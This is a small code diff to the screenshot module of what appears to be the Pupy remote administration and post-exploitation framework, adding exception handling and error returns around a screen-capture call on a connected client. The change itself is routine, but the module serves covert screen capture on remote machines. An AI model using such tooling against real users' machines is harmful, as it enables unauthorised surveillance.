@@ -78,9 +78,14 @@ class Screenshoter(PupyModule):
             config = self.client.pupsrv.config or PupyConfig()
             filepath_base = config.get_file('screenshots', {'%c': self.client.short_name()})
 
-            screenshots, error = screenshot(args.screen)
+            try:
+                screenshots, error = screenshot(args.screen)
+            except Exception, e:
+                self.error('Impossible to take a screenshot ("{0}"). Abording...'.format(e))
+                return -1
             if not screenshots:
                 self.error(error)
+                return -1
             else:
                 self.success('number of monitor detected: %s' % str(len(screenshots)))
 
